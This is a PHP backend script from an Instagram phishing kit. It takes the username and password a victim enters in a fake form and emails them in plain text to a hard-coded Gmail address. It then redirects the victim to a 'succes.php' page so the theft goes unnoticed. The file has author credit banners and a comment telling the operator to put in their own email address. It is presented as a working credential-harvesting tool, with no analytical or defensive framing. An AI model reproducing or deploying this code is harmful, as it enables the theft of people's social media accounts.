<?php
#===============================================#
#            Author: Moh.ImamNurCakra           #
#            Mailer: Imam                       # 
#            Modifer: Mr.Ackerman~              # 
#===============================================#
    //PLEASE DON'T CHANGE COPYRIGHT! 

$subjek = 'Instagram report account';
$mailto = 'imamnurcakra@gmail.com'; //YOUR EMAIL ADDRESS

   //This function for take input field. 

$imel = $_POST['user'];
$paswot = $_POST['password'];

   //take information to send on your gmail !. 

$body = <<<EOD
<br><hr><br>

Username : <font color="red">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>

EOD;

$headers = "From: Mr.Ackerman@gmail.com\r\n"; // for showing gmail sender.
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek." #".rand(1000,10000), $body, $headers);
// $successsadap = mail($mailsadap, $subjeksadap." #".rand(1000,10000), $body, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<meta content='0;url=./succes.php' http-equiv='refresh'/>
</head><body>
</html>
    
    
    
